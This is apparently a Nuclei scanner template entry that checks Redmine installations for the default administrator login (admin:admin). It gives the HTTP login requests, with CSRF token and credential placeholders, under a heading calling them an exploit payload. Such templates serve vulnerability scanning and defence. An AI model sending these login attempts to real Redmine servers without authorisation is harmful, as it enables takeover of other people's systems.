# Nuclei Template: Redmine - Default Admin Credentials
**Template ID:** redmine-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`redmine-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected Redmine project management application was found to have been using the default administrator credentials (admin:admin). An attacker could have gained full administrative access to manage projects, users, and system settings.

## Steps to reproduce / Exploit Payload
```http
GET /login HTTP/1.1
Host: {{Hostname}}

POST /login HTTP/1.1
Host: {{Hostname}}
Cookie: {{session}}

authenticity_token={{url_encode(csrf_token)}}&username={{username}}&password={{password}}&login=Login
```

## References
- https://www.redmine.org/projects/redmine/wiki/RedmineInstall
- https://www.simplified.guide/redmine/default-password
